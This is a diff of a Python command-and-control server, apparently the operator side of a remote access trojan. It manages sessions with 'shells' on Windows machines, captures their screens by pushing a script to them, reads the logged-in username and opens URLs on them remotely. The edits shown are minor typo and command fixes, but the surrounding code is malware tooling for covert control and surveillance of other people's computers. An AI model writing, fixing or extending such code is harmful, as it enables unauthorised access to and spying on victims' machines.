@@ -35,7 +35,7 @@ class Commands:
         menu Commands:
             help: shows this message
             back: gets deselects the session and gets you back to them main menu
-            sessions: [-s {sesion id} session id to sellect a session] [-d {sesion id} to dellete a session]
+            sessions: [-s session id] to sellect a session, [-d sesion id] to dellete a session
         
         session Commands|:
         disconnect: Disconnects from the selected shell
@@ -354,7 +354,7 @@ class Commands:
                 print("Too many argument type 'help' for more")
         # takes a screenshot
         elif message == "screenshot":
-            usersName = str(sendMessage("c o echo %USERNAME%").strip())
+            usersName = sendMessage("c o echo %USERNAME%").strip()
             with open("extraScripts/screen.py", "r") as file:
                 sendMessage(file.read())
             name = receiveMessage()
@@ -441,7 +441,7 @@ class Commands:
                     sleep(0.1)
         elif message == "url":
             if len(args) == 1:
-                sendMessage(f"c n explorer {args[0]}")
+                sendMessage(f"c n start {args[0]}")
             elif not args:
                 print("You need to specify an url")
             else:
@@ -532,5 +532,5 @@ listening = threading.Thread(target=startListening)
 menues = threading.Thread(target=mainMenu)
 
 listening.start()
-print(f"[SERVER] Server starten and now listening on {HOST}:{PORT}\n")
+print(f"[SERVER] Server started and now listening on {HOST}:{PORT}\n")
 menues.start()
